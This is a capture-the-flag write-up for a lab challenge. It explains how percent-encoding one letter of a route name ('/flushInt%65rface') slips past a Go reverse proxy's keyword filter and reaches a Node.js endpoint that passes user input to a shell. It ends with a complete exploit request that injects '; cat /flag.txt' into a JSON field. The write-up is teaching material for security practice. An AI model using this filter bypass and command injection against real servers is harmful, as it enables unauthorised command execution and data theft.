# HTB HTB Proxy — URL Encoding Bypass + Command Injection

## Overview

The challenge has two components:
- A **Go reverse proxy** that forwards requests to a backend, using the `Host` header to determine the destination.
- A **Node.js backend** with a `/flushInterface` route vulnerable to command injection.

## Backend Vulnerability

The Node.js app exposes:

```js
app.post("/flushInterface", validateInput, async (req, res) => {
    const { interface } = req.body;
    try {
        const addr = await ipWrapper.addr.flush(interface);
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error flushing interface"});
    }
});
```

The `ipWrapper.addr.flush` function passes the `interface` parameter directly into a shell `exec` call ([source](https://github.com/AlchemillaHQ/ip-wrapper/blob/master/src/addresses.js)):

```js
async flush(interface) {
    return new Promise((resolve, reject) => {
        exec(`ip addr flush ${interface}`, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            } else {
                resolve(stdout);
            }
        });
    });
}
```

No sanitization - `interface` goes straight into the shell. Classic OS command injection.

## The Filter

The Go proxy blocks direct access to the route:

```go
if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
    var responseText string = badReqResponse("Not Allowed")
    frontendConn.Write([]byte(responseText))
    frontendConn.Close()
    return
}
```

Decoding the byte slice: `flushinterface`. The proxy lowercases the URL and checks if it contains that string - blocking any request to `/flushInterface`.

## Bypass

The filter operates on the raw URL string *before* percent-decoding. Node.js/Express, however, decodes the URL before routing. URL-encoding a single character breaks the string match without affecting routing:

```
/flushInt%65rface
```

The Go proxy lowercases this to `/flushint%65rface` - no match, so it forwards the request. Express decodes `%65` → `e` and routes it to `/flushInterface` as normal.

## Exploit

```http
POST /flushInt%65rface HTTP/1.1
Host: <target>
Content-Type: application/json

{"interface": "eth0; cat /flag.txt"}
```

The command injection executes `ip addr flush eth0; cat /flag.txt` on the server and returns the flag in the response.
